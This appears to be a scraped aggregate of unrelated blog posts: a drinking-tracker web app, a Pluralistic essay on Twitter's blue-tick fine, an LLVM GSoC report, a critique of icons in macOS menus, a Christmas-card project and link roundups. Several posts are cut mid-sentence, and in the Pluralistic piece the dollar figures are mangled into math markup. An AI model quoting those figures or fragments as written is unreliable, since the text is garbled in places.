<p><img src="https://images.squarespace-cdn.com/content/v1/53f4e093e4b085e4457080e1/2f635761-69ce-4c40-a3aa-562b82c75be8/db_pwa_02.png?format=1000w" alt=""></p>
<p>Drinking Buddy lives, as a web app. The Forecast view and Custom Drinks are new features never implemented in the native iOS version.</p>
<p>Aside from assuming precedent means anything on the App Store, the big mistake I made in this process was diving deep into the “sweating the details” part of building my app before I’d tested Apple’s commitment to keeping you safe by forbidding simple math.
2</p>
<p>But the time and effort I put into the native Drinking Buddy did not go to waste. I turned my attention to <a href="https://lovable.dev">Loveable</a> (a turnkey web app vibe-coding platform), where I was able to rapidly build a near-clone of my SwiftUI app. I had the complete spec already and several screenshots to guide the process, and my experience with Bitrig had given me a good idea of where I was likely to bump into issues.</p>
<p>This greatly sped up the process, and I had a working version in less than a day. A week later, after some <a href="https://proloststore.com/products/beta">beta</a> feedback, I arrived at something even more powerful and feature-rich than the iOS-native version.</p>
<p>So now Drinking Buddy is a <a href="https://en.wikipedia.org/wiki/Progressive_web_app">Progressive Web App</a> — a web page that can be added to the Home Screen of your Apple or Android phone, where it will behave very much like a native app, even when offline. Your sensitive boozing data stays local and private, but it will be up to you to back up and restore your logs if you lose or replace your phone.</p>
<p><a href="https://proloststore.com/products/drinkingbuddy">And You Can Get It Here</a></p>
<h2>After All This, You Know What I Need?</h2>
<p><img src="https://images.squarespace-cdn.com/content/v1/53f4e093e4b085e4457080e1/41a61b23-e474-4f60-98c9-491d5c313f6f/DSC06920.jpg?format=1000w" alt=""></p>
<p>Cheers. If you’d like to try Drinking Buddy, it’s free, and works on any device you’re likely to have.</p>

<p>But one is literally called “OK to Drive”.</p>

<p>Obviously I understand of Apple’s concerns here. Some 99-cent app says your BAC was at zero an hour ago, so you get behind the wheel of a car and crash into an orphanage. At Apple’s scale, the liability is unmeasurable. While my app is well-intentioned, the App Store is genuinely besieged by bad actors of all kinds. I support Apple’s right to dictate what can and can’t be on their own store. I also believe that Apple would be in a lot less regulatory trouble (and community disfavor) if iOS and iPadOS worked more like the Mac, where apps not suitable for Apple’s explicit endorsement can be installed through other avenues.</p>

      <p>In woodworking, there's a saying that you should work with the grain, not against the grain and I've been thinking about how this concept may apply to large language models.</p>
<p>These large language models are built by training on existing data. This data forms the backbone</p>

      <p>
      <p>I’ve released a new extension for the Nova editor.</p>
<p>It’s called <em>Remove Comments</em> and it …removes comments from the current line, or selected lines, in your code. That’s it!</p>
<p>Oh, I’ve tried to support as many comment/syntax formats as I can think of. Sadly it’s not possible to get the current comment formatting from the Nova API, so I had to roll my own logic and heuristics.</p>

      <h1>Pluralistic: Elon Musk's Blue Tick scam (08 Dec 2025)</h1>

(date: 2025-12-08)
      <p>
      <p>Today's links Elon Musk's Blue Tick scam: The EU bans giant teddybears. Hey look at this: Delights to delectate. Object permanence: Denver bomb squad vs 8&quot; toy robot; Iceland's atheist religion; Largest strike in human history; Ad-tech is a bubble; Battery rationality; Pasta carpet; &quot;With a Little Help&quot;; Crooked Timber on Pikett; Tiki-mug menorah; China vs Big Data-backstabbing. Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Elon Musk's Blue Tick scam (permalink) In my book Enshittification, I develop the concept of &quot;giant teddybears,&quot; a scam that has been transposed from carnival midway games to digital platforms. The EU has just fined Elon Musk <span class="math inline">\(140m for running a giant teddybear scam on Twitter: https://arstechnica.com/tech-policy/2025/12/elon-musks-x-first-to-be-fined-under-eus-digital-service-act/ Growing up, August 15 always meant two things for my family: my mother's birthday and the first day of the CNE, a giant traveling fair that would park itself on Toronto's waterfront for the last three weeks of summer. We'd get there early, and by 10AM, there'd always be some poor bastard lugging around a galactic-scale giant teddybear that was offered as a prize at one of the midway games. Now, nominally, the way you won a giant teddybear was by getting five balls in a peach basket. To a first approximation, this is a feat that no one has ever accomplished. Rather, a carny had beckoned this guy over and said, "Hey, fella, I like your face. Tell you what I'm gonna do: you get just one ball in the basket and I'll give you one of these beautiful, luxurious keychains. If you win two keychains, I'll let you trade them in for one of these gigantic teddybears." Why would the carny do this? Because once this poor bastard took possession of the giant teddybear, he was obliged to conspicuously lug it around the CNE midway in the blazing, muggy August heat. All who saw him would think, "Hell if that dumbass can win a giant teddybear, I'm gonna go win one, too!" Charitably, you could call him a walking advertisement. More accurately, though, he was a Judas goat. Digital platforms have the ability to give out giant teddybears at scale. Because digital platforms have the flexibility that comes with running things on computers, platforms can pick out individual platform participants and make them King For the Day, showering them in riches that they will boast of, luring in other suckers who will lose everything: https://pluralistic.net/2023/02/19/twiddler/ That's how Tiktok works: the company's "heating tool" lets them drive traffic to Tiktok performers by cramming their videos into millions of random people's feeds, overriding Tiktok's legendary recommendation algorithm. Those "heated" performers get millions of views on their videos and go on to spam all the spaces where similar performers hang out, boasting of the fame and riches that await other people in their niche if they start producing for Tiktok: https://pluralistic.net/2023/01/21/potemkin-ai/#hey-guys Uber does it, too: as Veena Dubal documents in her work on "algorithmic wage discrimination," Uber offers different drivers wildly different wages for performing the same work. The lucky few who get an Uber giant teddybear hang out in rideshare groupchats and forums, trumpeting their incredible gains from the platform, while everyone else blames themselves for "being bad at the app," as they drive and drive, only to go deeper and deeper into debt: https://pluralistic.net/2023/04/12/algorithmic-wage-discrimination/#fishers-of-men Everywhere you look online, you see giant teddybears. Think of Joe Rogan being handed hundreds of millions of dollars to relocate his podcast to Spotify, an also-ran podcast platform that is desperately trying to capture the medium of podcasting, turning an open protocol into a proprietary, enclosed, Spotify-exclusive content stream: https://pluralistic.net/2023/01/27/enshittification-resistance/#ummauerter-garten-nein The point of the conspicuous, over-the-odds payment to Rogan isn't just to get Rogan onto Spotify – it's to convince every other podcaster that Spotify is a great place to make podcasts for. It isn't, though: when Spotify bought Gimlet Media, they locked Gimlet's podcasts inside Spotify's walled garden/maximum security prison. If you wanted to listen to a Gimlet podcast, you'd have to switch to using Spotify's app (and submitting to Spotify's invasive surveillance and restrictions on fast-forwarding through ads, etc). Pretty much no one did this. After an internal revolt by Gimlet podcast hosts – whose podcasts were dwindling to utter irrelevance because no one was listening to them anymore – Spotify moved those Gimlet podcasts back onto the real internet, where they belong. When Musk bought Twitter, he started handing out tons of giant teddybears – most notably, he created an opaque monetization scheme for popular Twitter posters, which allowed him to thumb the scales for a few trolls he liked, who obliged him by loudly proclaiming just how much money you could make by trolling professionally on Twitter. Needless to say, the vast majority of people who try this make either nothing, or a sum so small that it rounds to nothing. But Musk's main revenue plan for Twitter – the thing he repeatedly promised would allow him to recoup the tens of billions he borrowed to buy the platform – was selling blue tick verification. Twitter created blue ticks to solve a serious platform problem. Twitter users kept getting sucked in by impersonators who would trick them into participating in scams or believing false things. To protect those users, Twitter offered a verification scheme for "notable people" who were likely to face impersonation. The verification system was never very good – I successfully lobbied them to improve it a little when I was being impersonated on Twitter (I got them to stop insisting that users fax them a scan of their ID, or, more realistically, to send them ID via a random, insecure email-to-fax gateway). But it did the job reasonably well. Predictably, though, the verification scheme also became something of a (weird and unimportant) status-symbol, allowing a certain kind of culture warrior to peddle grievances about how only "lamestream media libs" were getting blue ticks, while brave Pizzagaters and 4chan refugees were denied this important recognition. Musk's plan to sell blue ticks leaned heavily into these grievances. He promised to "democratize" verification, for \)</span>8/month (or, for businesses, many thousands of dollars per month). Users who didn't buy blue ticks would have their content demoted and hidden from their own followers. Users who paid for blue ticks would have their content jammed into everyone's feeds, irrespective of whether Twitter's own content recommendation algorithms predicted those users would enjoy it. Best of all, Twitter wouldn't do much verifying – you could give Twitter <span class="math inline">\(8, claim to be anyone at all, and chances are, you would be able to assume any identity you wanted, post any bullshit you wanted, and get priority placement in millions of users' feeds. This was a massive gift to scammers, trolls and disinformation peddlers. For \)</span>8, you could pretend to be a celebrity in order to endorse a stock swindle, shitcoin hustle, or identity theft scheme. You could post market-moving disinformation from official-looking corporate accounts. You could pose as a campaigning politician or a reporter and post reputation-destroying nonsense. This is where the EU comes in. In 2024, the EU enacted a pair of big, muscular Big Tech antitrust laws, the Digital Services Act (DSA) and the Digital Markets Act (DMA). These are complex pieces of legislation, and I don't like everything in them, but some parts of them are amazing: bold and imaginative breaks from the dismal history of ineffective or counterproductive tech regulation. Under the DSA, the EU has fined Twitter about <span class="math inline">\(140m for exposing users to scams via this blue tick giant teddybear wheeze (much of that sum is punitive, because Twitter flagrantly obstructed the Commission's investigations). The DSA (sensibly) doesn't require user verification, but it does expect companies that tell their users that some accounts are verified and can be trusted, to actually verify that they actually can be trusted. I think there's a second DSA claim to be made here, beyond the failure to verify. Musk's plan to sell blue ticks was a disaster: while many, many scammers (and a few trolls) bought blue ticks, no one else did. The blue tick – which Musk thought of as a valuable status symbol that he could sell – was quickly devalued. "Account with a blue tick" was never all that prestigious, but under Musk, it came to mean "account that pushes scams, gore, disinformation, porn and/or hate." So Musk did something very funny and sweaty. He restored blue ticks to millions of high-follower accounts (including my own). And despite the fact that Musk had created about a million different kinds of blue ticks that denoted different kinds of organizations and payment schemes, these free blue ticks were indistinguishable from the paid ones. In other words, Musk set out to trick users into thinking that the most prominent people they followed believed that it was worth spending \)</span>8/month on a blue tick. It was an involuntary giant teddybear scam. Every time a prominent user with a free blue tick posts, they help Musk trick regular Twitter users into thinking that these worthless $8/month subscriptions are worth shelling out for. I think the Commission could run another, equally successful enforcement action against Musk and Twitter over this scam, too. Trump has been bellyaching nonstop about the DSA and DMA, threatening EU nations and businesses with tariffs and other TACO retribution if they go ahead with DSA/DMA enforcement. Let's hope the EU calls his bluff. Of course, Musk could get out of paying these fines by moving all his businesses out of the EU, which, frankly, would be a major result for Europe.

      <h1>Substitution Cipher Based on The Voynich Manuscript</h1>

(date: 2025-12-08)
      <p>
      <p>Here’s a fun paper: “ <a href="https://www.tandfonline.com/doi/full/10.1080/01611194.2025.2566408">The Naibbe cipher: a substitution cipher that encrypts Latin and Italian as Voynich Manuscript-like ciphertext</a>“:</p>
<blockquote>
<p><strong>Abstract:</strong> In this article, I investigate the hypothesis that the Voynich Manuscript (MS 408, Yale University Beinecke Library) is compatible with being a ciphertext by attempting to develop a historically plausible cipher that can replicate the manuscript’s unusual properties. The resulting cipher­a verbose homophonic substitution cipher I call the Naibbe cipher­can be done entirely by hand with 15th-century materials, and when it encrypts a wide range of Latin and Italian plaintexts, the resulting ciphertexts remain fully decipherable and also reliably reproduce many key statistical properties of the Voynich Manuscript at once. My results suggest that the so-called “ciphertext hypothesis” for the Voynich Manuscript remains viable, while also placing constraints on plausible substitution cipher structures...</p>

      <p><strong><a href="https://www.niche-museums.com/116">Niche Museums: The Museum of Jurassic Technology</a></strong></p>
<p>I finally got to check off the museum that's been top of my want-to-go list since I first started documenting niche museums I've been to back in 2019.</p>
<p>The Museum of Jurassic Technology opened in Culver City, Los Angeles in 1988 and has been leaving visitors confused as to what's real and what isn't for nearly forty years.</p>

      <h1>Making LLVM Compilation Data Accessible: A Unified Visualization Tool for Compiler Artifacts</h1>

(date: 2025-12-08)
      <p>
      <p>This summer, I had the incredible opportunity to work on an LLVM project through Google Summer of Code 2025. As an undergraduate student passionate about compilers, I set out to tackle a problem that many LLVM developers face daily: the overwhelming nature of compilation data scattered across different flags, output formats, and locations.</p>
<h2>The Problem: Information Overload</h2>
<p>LLVM generates a wealth of valuable data during compilation-optimization, including optimization remarks, profiling information, timing data, and more. However, this information is often difficult to process and analyze, especially for developers new to LLVM or those working with offloading toolchains. The typical workflow involves:</p>
<ul>
<li>Searching through thousands of remarks using grep</li>
<li>Manually correlating data across compilation units</li>
<li>Trial-and-error debugging without data-driven insights</li>
<li>Wrestling with different output formats and flags</li>
</ul>
<p>This fragmented approach makes it particularly challenging for newcomers to understand what’s happening during compilation and how to optimize their code effectively.</p>
<h2>Project Goals</h2>
<p>The goal was to create a unified infrastructure that organizes, visualizes, and analyzes compilation data for the LLVM toolchain. Specifically, I aimed to:</p>
<ul>
<li>Make compiler data accessible to everyone, not just experts</li>
<li>Reduce the frustration of searching through compilation artifacts</li>
<li>Enable data-driven optimization decisions</li>
<li>Create a foundation for advanced analysis tools</li>
<li>Make offloading development more approachable</li>
</ul>
<h2>What I Built</h2>
<p>Over the 12-week program, I developed a working prototype called <strong>LLVM Advisor</strong> that addresses these challenges through several key components:</p>
<h3>Compiler Wrapper Tool</h3>
<p>I created an easy-to-use wrapper (similar to ccache) that automatically collects all relevant compilation artifacts without requiring users to modify their build systems. The wrapper intelligently parses and organizes data into a structured format.</p>
<h3>Storage Layer</h3>
<p>The tool uses a JSON-based storage format that supports:</p>
<ul>
<li>Project-wide linking of related files</li>
<li>Incremental updates and differential views</li>
<li>Cross-compilation unit correlation</li>
</ul>
<h3>Web-Based Visualization Interface</h3>
<p>The heart of the project is an intuitive dashboard that provides:</p>
<ul>
<li><strong>Overview Dashboard</strong>: Key metrics, summaries, and aggregated findings at a glance</li>
<li><strong>Source Code Viewer</strong>: Interactive code browser with inline remarks and diagnostics</li>
<li><strong>Performance Timeline</strong>: Detailed analysis of compilation phases and bottlenecks</li>
</ul>
<h3>Analysis Capabilities</h3>
<p>The tool offers several analysis features:</p>
<ul>
<li>Cross-unit analysis views</li>
<li>Performance tracking across builds</li>
<li>Optimization effectiveness monitoring</li>
<li>Pattern recognition in compilation issues</li>
</ul>
<h2>Key Achievements</h2>
<p>Throughout the program, I made steady progress on both the technical implementation and community engagement:</p>
<p><strong>Weeks 1-2</strong>: Fixed a critical issue in the NVLINK wrapper that prevented collecting remarks for NVIDIA targets (submitted as PR <a href="https://github.com/llvm/llvm-project/pull/145365">#145365</a>) and implemented the initial wrapper.</p>
<p><strong>Weeks 3-4</strong>: Developed the remarks parser and created the first version of the web interface with source viewing capabilities.</p>
<p><strong>Weeks 5-6</strong>: Designed the compiler wrapper architecture and storage layer, with extensive discussions with mentors about effective data presentation.</p>
<p><strong>Weeks 7-8</strong>: Presented the project to the LLVM community and improved the web server foundation.</p>
<p><strong>Weeks 9-12</strong>: Completed the source viewer, implemented the performance timeline, and expanded parsing support for various file types.</p>
<p><strong>Final Week</strong>: Deployed a live demo and completed documentation.</p>
<h2>Technical Highlights</h2>
<p>One of the most challenging aspects was designing a flexible data pipeline that could correlate scattered information from various compiler outputs <strong>without any dependency</strong>. The solution involved:</p>
<ul>
<li><strong>Smart Parsing</strong>: Robust regex patterns and parsers for different LLVM output formats</li>
<li><strong>Data Correlation</strong>: Algorithms to link remarks, timing data, and source locations across compilation units</li>
<li><strong>Incremental Processing</strong>: Efficient handling of large codebases with differential updates</li>
<li><strong>Intuitive UI</strong>: A clean interface that presents complex multi-layered data without overwhelming users</li>
</ul>
<h2>Community Impact</h2>
<p>This project represents more than just a tool—it’s a step toward making LLVM more accessible. As someone from Latin America, where compiler topics aren’t commonly discussed, I’m passionate about lowering barriers to entry in the LLVM community.</p>
<p>The tool could be valuable for:</p>
<ul>
<li><strong>New Contributors</strong>: Providing visual guidance for understanding optimization behavior</li>
<li><strong>Experienced Developers</strong>: Offering data-driven insights for performance tuning</li>
<li><strong>Educational Use</strong>: Helping students visualize what compilers actually do</li>
</ul>
<h2>Try It Yourself</h2>
<p>You can explore a live demo of LLVM Advisor at: <a href="https://llvm-advisor.onrender.com/">https://llvm-advisor.onrender.com/</a></p>
<p>The complete implementation is available in PR <a href="https://github.com/llvm/llvm-project/pull/147451">#147451</a>, and you can see the development timeline at: <a href="https://time.graphics/line/999689/">https://time.graphics/line/999689/</a>.</p>
<h2>Looking Forward</h2>
<p>This project lays a strong foundation with many exciting opportunities ahead:</p>
<ul>
<li><strong>LLM Integration</strong>: Leveraging Large Language Models to provide automated insights and recommendations</li>
<li><strong>Enhanced Analytics</strong>: More sophisticated performance heuristics and pattern detection</li>
<li><strong>Community Features</strong>: Sharing optimization patterns and best practices across the community</li>
<li><strong>Extended Platform Support</strong>: Broader coverage of LLVM’s diverse target architectures</li>
</ul>
<h2>Personal Reflections</h2>
<p>Working on this project through GSoC has been transformative. I’ve gained deep technical knowledge in LLVM’s remark system, full-stack development, and build system integration. More importantly, it’s confirmed my passion for making compilers accessible to everyone.</p>
<p>My goal is to continue as a maintainer and help grow the LLVM community, particularly in underrepresented regions. I believe that by making compiler technology more approachable, we can unlock innovation from developers around the world.</p>
<h2>Acknowledgments</h2>
<p>I want to thank the LLVM community and my mentors for their guidance throughout this journey. The collaborative spirit and technical excellence of the LLVM project continues to inspire me, and I look forward to contributing to this amazing ecosystem for years to come.</p>
<p>As we often say in the compiler community: LLVM is the place for hackers, nerds, and anyone who likes what they’re doing—because no one with common sense takes a glance at compilers at first, but once you get in, you’re always willing to learn more and experiment more. We are the alchemists of new days, and projects like this help ensure that alchemy remains accessible to all.</p>

<p>The promise of AI – the promise AI companies make to investors – is that there will be AIs that can do your job, and when your boss fires you and replaces you with AI, he will keep half of your salary for himself, and give the other half to the AI company.</p>
<p>That's it.</p>
<p>That's the $13T growth story that MorganStanley is telling. It's why big investors and institutionals are giving AI companies hundreds of billions of dollars. And because <em>they</em> are piling in, normies are also getting sucked in, risking their retirement savings and their family's financial security.</p>

      <h1>Icons in Menus Everywhere — Send Help</h1>

(date: 2025-12-07)
      <p>
      <p><a href="https://mastodon.social/@jimniels/115556046706814962">I complained about this on the socials</a>, but I didn’t get it all out of my system. So now I write a blog post.</p>
<p>I’ve never liked the philosophy of “put an icon in every menu item by default”.</p>
<p>Google Sheets, for example, does this. Go to “File” or “Edit” or “View” and you’ll see a menu with a list of options, every single one having an icon (same thing with the right-click context menu).</p>
<p><img src="https://cdn.jim-nielsen.com/blog/2025/context-menu-sheets.png" alt="Screenshot of menus with icons in Google Sheets"></p>
<p>It’s extra noise to me. It’s not that I think menu items should <em>never</em> have icons. I think they can be incredibly useful (more on that below). It’s more that I don’t like the idea of “give each menu item an icon” being the default approach.</p>
<p>This posture lends itself to a practice where designers have an attitude of “I need an icon to fill up this space” instead of an attitude of “Does the addition of a icon here, and the cognitive load of parsing and understanding it, help or hurt how someone would use this menu system?”</p>
<p>The former doesn’t require thinking. It’s just templating — they all have icons, so we need to put <em>something</em> there. The latter requires care and thoughtfulness for each use case and its context.</p>
<p>To defend my point, one of the examples I always pointed to was macOS. For the longest time, Apple’s OS-level menus seemed to avoid this default approach of sticking icons in every menu item.</p>
<p>That is, until macOS Tahoe shipped.</p>
<h2>Menus in macOS Tahoe</h2>
<p>Tahoe now has icons in menus everywhere. For example, here’s the Apple menu:</p>
<p><img src="https://cdn.jim-nielsen.com/blog/2025/context-menu-mac.png" alt="Screenshot of the Apple menu in macOS tahoe where every menu item is prefixed with an icon."></p>
<p>Let’s look at others. As I’m writing this I have Safari open. Let’s look at the “Safari” menu:</p>
<p><img src="https://cdn.jim-nielsen.com/blog/2025/context-menu-safari-about.png" alt="Screenshot of the Safari menu in macOS Tahoe where about half of the menu items are prefixed with an icon."></p>
<p>Hmm. Interesting. Ok so we’ve got an icon for like half the menu items. I wonder why some get icons and others don’t?</p>
<p>For example, the “Settings” menu item (third from the top) has an icon. But the other item in its grouping “Privacy Report” does not. I wonder why? Especially when Safari has an icon for Privacy report, like if you go to customize the toolbar you’ll see it:</p>
<p><img src="https://cdn.jim-nielsen.com/blog/2025/context-menu-macos-safari-privacy-report.png" alt="Screenshot of the Customize Toolbar UI in Safari and the Privacy Report button has a red highlight around indicating its icon."></p>
<p>Hmm. Who knows? Let’s keep going.</p>
<p>Let’s look at the &quot;File&quot; menu in Safari:</p>
<p><img src="https://cdn.jim-nielsen.com/blog/2025/context-menu-safari-file.png" alt="Screenshot of the File menu Safari in macOS Tahoe where only a few menu items are prefixed with an icon. Some are indented, others not."></p>
<p>Some groupings have icons and get inset, while other groupings don’t have icons and don’t get inset. Interesting…again I wonder what the rationale is here? How do you choose? It’s not clear to me.</p>
<p>Let’s keep going. Let’s go to the &quot;View&quot; menu:</p>
<p><img src="https://cdn.jim-nielsen.com/blog/2025/context-menu-safari-view.png" alt="Screenshot of the View menu in Safari on macOS Tahoe where some menu items are prefixed with an icon and two also have a checkmark."></p>
<p>Oh boy, now we’re really in it. Some of these menu items have the notion of a toggle (indicated by the checkmark) so now you’ve got all kinds of alignment things to deal with. The visual symbols are doubling-up when there’s a toggle <em>and</em> an icon.</p>
<p>The “View” menu in Mail is a similar mix of:</p>
<ul>
<li>Text</li>
<li>Text + toggles</li>
<li>Text + icons</li>
<li>Text + icons + toggles</li>
</ul>
<p><img src="https://cdn.jim-nielsen.com/blog/2025/context-menu-mail-view.png" alt="Screenshot of the View menu in Mail on macOS Tahoe showing how menu items can be indented and have icons, not have icons, and have toggles with checkmarks."></p>
<p>You know what would be a fun game? Get a bunch of people in a room, show them menus where the textual labels are gone, and see who can get the most right.</p>
<p><img src="https://cdn.jim-nielsen.com/blog/2025/context-menu-app-edit.png" alt="Screenshot of a menu in macOS Tahoe where every menu item is prefixed with an icon but the labels are blurred out so you don’t know for sure what each menu item is."></p>
<p>But I digress.</p>
<p>In so many of these cases, I honestly can’t intuit why some menus have icons and others do not. What are so many of these icons affording me at the cost of extra visual and cognitive parsing? I don’t know.</p>
<p>To be fair, there are <em>some</em> menus where these visual symbols are incredibly useful. Take this menu from Finder:</p>
<p><img src="https://cdn.jim-nielsen.com/blog/2025/context-menu-finder-window.png" alt="Screenshot of a Finder menu in macOS Tahoe where every menu item is prefixed with a useful icon."></p>
<p>The visual depiction of how those are going to align is actually incredibly useful because it’s way easier for my brain to parse the symbol and understand where the window is going to go than it is to read the text and imagine in my head what “Top Left” or “Bottom &amp; Top” or “Quarters” will mean. But a visual symbol? I instantly get it!</p>
<p>Those are good icons in menus. I like those.</p>
<h2>Apple Abandons Its Own Guidance</h2>
<p>What I find really interesting about this change on Apple’s part is how it seemingly goes against their own previous human interface guidelines (as <a href="https://mastodon.gassner.io/@peter/115559008588925643">pointed out to me by Peter Gassner</a>).</p>
<p>They have an entire section in their 2005 guidelines ( <a href="https://mastodon.decentralised.social/@wezm/115686422177826944">and 1992</a> <a href="https://web.archive.org/web/20201027235952/https://developer.apple.com/design/human-interface-guidelines/macos/menus/menu-anatomy/">and 2020</a>) titled “Using Symbols in Menus”:</p>
<p><img src="https://cdn.jim-nielsen.com/blog/2025/context-menu-hig.png" alt="Screenshot from Apple’s Human Interface Guidelines"></p>
<p>See what it says?</p>
<blockquote>
<p>There are a few standard symbols you can use to indicate additional information in menus…Don’t use other, arbitrary symbols in menus, because they add visual clutter and may confuse people.</p>
</blockquote>
<p>Confused people. That’s me.</p>
<p>They even have an example of what <em>not</em> to do and guess what it looks like? A menu in macOS Tahoe.</p>
<p><img src="https://cdn.jim-nielsen.com/blog/2025/context-menu-hig-donts.png" alt="Screenshot from the HIG denoting how you shouldn’t use arbitrary symbols in menus."></p>
<h2>Conclusion</h2>
<p>It’s pretty obvious how I feel. I’m tired of all this visual noise in my menus.</p>
<p>And now that Apple has seemingly thrown in with the “stick an icon in every menu by default” crowd, it’s harder than ever for me to convince people otherwise. To persuade, “Hey, unless you can articulate a really good reason to add this, maybe our default posture should be no icons in menus?”</p>
<p>So I guess this is the world I live in now. Icons in menus. Icons in menus everywhere.</p>

      <blockquote>
<p>AI has the Jeopardy Phenomenon too.</p>
<p>If you use it to generate code that is outside your expertise, you are likely to think it’s all well and good, especially if it seems to work at first pop. But if you’re intimately familiar with the technology or the code around the code it’s generating, there is a good chance you’ll be like <em>hey! that’s not quite right</em>!</p>
</blockquote>
<p>Not just code. I’m astounded by the cognitive dissonance displayed by people who say “I asked an LLM about {topic I’m familiar with}, and here’s all the things it got wrong” who then proceed to say “It was really useful when I asked an LLM for advice on {topic I’m not familiar with, hence why I’m asking an LLM for advice}.”</p>
<p>Like, if you know that the results are super dodgy for your own area of expertise, why would you think they’d be any better for, I don’t know, restaurant recommendations in a city you’ve never been to?</p>

      <h1>Christmas Card, 2024 Edition</h1>

(date: 2025-12-07)
      <p>
      <p>This is an archived version of <a href="/christmas">the page describing my 2024 Christmas Card</a>.</p>
<hr>
<p>Hello! You’ve perhaps reached this page because you received a Christmas card that looked something like this:</p>
<figure>
<a href="/images/christmas-card-01.jpg">
<img src="/images/christmas-card-01.jpg" alt="Merry Christmas!">
</a>
<figcaption><p>Merry Christmas!</p></figcaption>
</figure>
<p>Your card was handmade and totally unique! It’s part of a series of cards I made this year:</p>
<p>As far as I know this is the first series of Christmas cards that form a stop motion animation, the first to use 3D → 2.5D conversion for cut card, and a <em>shockingly</em> rare example of a geographically accurate London Christmas card!</p>
<p>So now for the story of how I put <em>entirely</em> too much effort into this year’s Christmas cards…</p>
<p>Last Christmas, after years of sending perfectly nice but not very personal commercial cards, I decided to make my own. Seeing as I’d finished <a href="/blog/2024/5/19/running-the-river-thames/">running the River Thames this spring</a> it seemed fitting to feature the river somehow. Tower Bridge is almost certainly the most recognisable point on the river, so I set the card there.</p>
<p>However, there was one small problem when I started this project back in August: I can’t draw. No sense of proportion or perspective. Nada.</p>
<p>So instead I turned to the only logical alternative: learn the basics of 3D modelling in <a href="https://www.blender.org">Blender</a>. <a href="#2025-12-07-christmas-card-2024-editionfn1">1</a> After a few attempts at simpler projects I set about modelling my scene. I used <a href="https://www.openstreetmap.org/#map=6/54.91/-3.43">OpenStreetMap data</a> to grab all of central London’s buildings, and then modelled a few more prominent buildings manually:</p>
<p><img src="/images/blender-city-of-london.png" alt=""></p>
<p><img src="/images/blender-tower-bridge.png" alt=""></p>
<p>Next, I added a sleigh and some reindeer and worked out how to animate them, the camera, and Tower Bridge:</p>
<p>I had to transform the 3D models into 2D outlines that I could cut into card. To avoid cutting over 500 pieces of card by hand I instead bought a <a href="https://cricut.com/en-gb/">Cricut cutting machine</a>, which can take 2D SVG files and cut them into card. Although there are Blender plugins that can produce SVGs I couldn’t find anything that did exactly what I wanted, so I spent a <a href="https://en.wikipedia.org/wiki/TGV">TGV</a> ride through France writing Python scripts to rasterise my scene’s triangles into 2D, and then relied on Inkscape’s automation to combine these. <a href="#2025-12-07-christmas-card-2024-editionfn2">2</a></p>
<figure>
<a href="/images/christmas-card-layers.png">
<img src="/images/christmas-card-layers.png" alt="">
</a>
<figcaption><p>1 base white card layer; 6 layers of bright blue card for most of the City of London’s skyline, including St Paul’s, the Barbican, 22 Bishopsgate, the Walkie Talkie, the Gherkin, and the Tower of London; 3 dark blue layers for Tower Bridge; and 2 pieces of red card for the sleigh, reindeer, and frame.</p></figcaption>
</figure>
<p>The Python scripts also generated pixelated “support layers”. Each final card is constructed of 10 coloured layers. I manually assigned which layer each building appears as this prevented buildings “jumping” between layers between different cards. The layers are set up to ensure that all elements are either joined with the frame or, in the case of the sleigh and reindeer, can be aligned with a matching copy on the layer below.</p>
<p>I got through two Pritt sticks gluing all the cards together.</p>
<p>Each card layer is 300gsm; this is thick enough that the Cricut needed two passes to reliably separate the card. In retrospect thinner card would’ve worked better. Cutting the top red layer alone took about 2 minutes; cutting all 3 layers of Tower Bridge took 12.</p>
<p>Cutting these took… a while. I worked in batches and got through several seasons of several TV shows in the background. Assuming nothing went wrong I could typically cut a card in about half an hour, but as I had to cut around 250 A4 sheets I regularly destroyed the cutting mats I was working with, so the card would sometimes slip off and I’d have to start over.</p>
<p>Finally, each card was lined with <a href="https://rhodiapads.com">Rhodia paper</a> and I signed them with <a href="https://www.gouletpens.com/products/robert-oster-heart-of-gold-50ml-bottled-ink">Robert Oster’s Heart of Gold</a> ink. Each card is numbered by the original frame from the Blender animation. (I skipped some frames.)</p>
<p>I <em>strongly</em> suspect next year’s cards will be a little simpler… I worked on this on-and-off for much of the autumn, with a final push to actually cut and construct all the cards in late November. Including all the modelling, animation, programming, cutting, gluing, and writing time I easily invested over 150 hours over 4 months.

<p>It’s been years since I last tried Blender but this was the first time I built anything complex. That said I wasn’t starting from nothing: <a href="https://www.linkedin.com/in/thomaswdenney/">3D graphics aren’t exactly new to me</a>. <a href="#2025-12-07-christmas-card-2024-editionfnref1">↩︎</a></p>

<p>For the first time I also relied on <a href="https://en.wikipedia.org/wiki/Large_language_model">LLMs</a> to write a lot of the more boring code for me. A lot of the code is simple: matrix-vector multiplication; depth first searches; filtering geometry that’s too small to cut based on the size of its convex hull. My attitude towards all this code was <a href="https://en.wikipedia.org/wiki/Trust%2C_but_verify">trust, but verify</a>. I could’ve written all this myself but I used the LLM only to accelerate the process. <a href="#2025-12-07-christmas-card-2024-editionfnref2">↩︎</a></p>

      <p>These are some things I’ve wandered across on the web this week.</p>
<h2>🔖 <a href="https://www.brendangregg.com/blog/2024-10-29/ai-flame-graphs.html">AI Flame Graphs</a></h2>
<p>It’s been a mind-bending experience, revealing what gets taken for
granted because it has existed in CPU land for decades: A process table.
Process tools. Standard file formats. Programs that exist in the file
system. Programs running from main memory. Debuggers. Profiliers. Core
dumping. Disassembling. Single stepping. Static and dynamic
instrumentation. Etc. For GPUs and AI, this is all far less mature. It
can make the work exciting at times, when you think something is
impossible and then find or devise a way.</p>
<h2>🔖 <a href="https://pelagicpublishing.com/products/the-data-management-workbook">The Data Management Workbook Practical Exercises for BetterOrganization, Storage and Use of Your Research Data</a></h2>
<p>The Data Management Workbook helps researchers design useful
data-management plans through a step-by-step series of structured
exercises, worksheets and checklists, including: - creating a data
dictionary - evaluating a lab notebook - finding the best way to
organize your files - setting up useful file naming conventions -
writing effective README.txt files - selecting the right data repository
- determining data stewardship - preparing data for future use</p>
<h2>🔖 <a href="https://www.bohyunkim.net/blog/archives/4443">What I Think About AI When I Hear About AI: A Slightly UnconventionalView</a></h2>
<p>Furthermore, I think it is worth noting that the online environment,
where we get to use AI as an individual consumer and mostly for
productivity, makes this problem even more acute. This time, picture a
big circle of villagers sitting around a bonfire and talking with one
another. You will soon discover that some of those villagers heard a lot
of stories; some have sharp analytic skills; some has memorized a lot of
facts; some have practical skills but not good at speaking and
